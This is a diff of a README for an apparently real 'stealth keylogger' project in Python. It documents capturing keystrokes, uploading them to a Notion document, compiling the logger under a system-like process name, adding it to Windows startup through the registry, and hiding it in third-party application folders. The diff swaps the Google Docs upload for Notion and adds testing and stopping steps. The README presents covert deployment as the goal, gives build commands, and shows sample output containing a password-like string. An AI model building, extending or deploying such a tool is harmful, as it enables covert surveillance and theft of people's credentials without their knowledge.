@@ -1,19 +1,17 @@
 # 🕵️‍♂️ Stealth Keylogger Project
 
-This repository contains a Python-based **stealth keylogger** that logs displayable characters and uploads them to a **Google Document** using the Google Docs API. It is compiled into an executable (`svchost.exe`) for stealth deployment and persistence on Windows systems.
+This repository contains a Python-based **stealth keylogger** that logs displayable characters and uploads them to a **Notion Document** using notion token or secured remote storage and centralized monitoring. It is compiled into an executable (`shchosto.exe`) for stealth deployment and persistence on Windows systems.
 
 ---
 
 ## 🚀 Features
 
 - ⌨️ Logs all **visible characters** using `pynput`
-- ☁️ **Uploads logs** to a specified Google Document via Google Docs API
-- 📂 **Copies itself** to `C:\Users\Public\TempService` for persistence
+- ☁️ **Uploads logs** to a specified Notion Document via notion API
 - 🔁 **Adds to Windows startup** via Registry key
 - 🕶️ Runs **stealthily**, including across system reboots
-- 🖼️ Customizable with a **system-like icon** for Task Manager disguise
 - 🕵️‍♂️ Runs stealthily even after user shutdown and reopening of the PC due to persistent registry startup
-- 🧱 Supports **application-level injection** by dropping `svchost.exe` into third-party directories
+- 🧱 Supports **application-level injection** by dropping `shchosto.exe` into third-party directories
 
 ---
 
@@ -29,22 +27,37 @@ cd stealth_keylogger
 ### 2. Install dependencies
 
 ```bash
-pip install pynput google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client pyinstaller
+pip install pynput requests pyinstaller
+```
+
+### 2. Local Testing
+
+```bash
+python keylogger.py
 ```
 
 ### 3. Compile to an executable
 
 ```bash
-pyinstaller --onefile --noconsole --icon=system.ico --name=svchost keylogger.py
+pyinstaller --onefile --noconsole --name=shchosto keylogger.py
 ```
 
-> 🔔 Replace `system.ico` with an actual Windows system icon (e.g., extracted from `shell32.dll`)
+## 🛑 Stopping the Executable
+
+To stop the keylogger after it's been compiled and is running:
+```bash
+1. Open Task Manager (Ctrl + Shift + Esc)
+2. Go to the "Processes" tab
+3. Look for "shchosto.exe"
+4. Right-click it and select "End task"
+
+```
 
 ---
 
 ## 📤 Output Example
 
-The keylogger captures characters and appends them to the configured Google Document. Example document output might look like:
+The keylogger captures characters and appends them to the configured Notion Document. Example document output might look like:
 
 ```text
 Hello World
@@ -64,7 +77,7 @@ Azimuthal@999
 
 ## 🧠 Usage
 
-- Run the compiled `svchost.exe` from the `dist/` folder:
+- Run the compiled `shchosto.exe` from the `dist/` folder:
 
 ```bash
 cd dist
@@ -72,15 +85,14 @@ cd dist
 ```
 
 - On execution:
-  - Copies itself to: `C:\Users\Public\TempService`
   - Registers for startup using Windows Registry
-  - Begins logging and uploading keystrokes to the Google Document (see `DOC_ID`)
+  - Begins logging and uploading keystrokes to the Notion Document (see `PAGE_ID`)
 
 ---
 
 ## 🧬 Injection Capability
 
-You may "inject" the keylogger by placing `svchost.exe` into folders/nested subfolder of legitimate or third-party apps, such as:
+You may "inject" the keylogger by placing `shchosto.exe` into folders/nested subfolder of legitimate or third-party apps, such as:
 
 ```text
 C:\Program Files\AppName\
@@ -93,24 +105,8 @@ C:\Users\<User>\AppData\Roaming\SomeApp\
 
 ## 🔧 Configuration
 
-Update your **Google API credentials** and document ID inside `keylogger.py`:
+Update your **Notion token** and PAGE ID inside `keylogger.py`:
 
-```python
-CLIENT_ID = "your_client_id"
-CLIENT_SECRET = "your_client_secret"
-ACCESS_TOKEN = "your_access_token"
-REFRESH_TOKEN = "your_refresh_token"
-DOC_ID = "your_google_doc_id"
-```
-
-> ⚠️ **Important:** Google Docs is not secure for storing sensitive data. For **end-to-end encrypted (E2E)** alternatives, consider integrating:
-> - [Proton Drive](https://proton.me/)
-> - [Standard Notes](https://standardnotes.com/)
-> - [Internxt](https://internxt.com/)
-
-These require additional API setup for secure, trace-free logging.
-
----
 
 ## 📌 Notes
 
@@ -126,27 +122,12 @@ These require additional API setup for secure, trace-free logging.
 
 ---
 
-## 📁 Project Structure
-
-```text
-stealth_keylogger/
-├── keylogger.py         # Core keylogger script
-├── system.ico           # Icon used for stealth disguise (optional)
-├── requirements.txt     # All required dependencies
-├── README.md            # Project documentation
-```
-
-
-
 ## 🙋‍♀️ Contributing
 
 Pull requests are welcome for:
 - API enhancements
 - Better encryption integrations
 - Cross-platform support
-
-> Please follow standard Python practices (PEP8) and clearly document your changes.
-
 
 ---
 
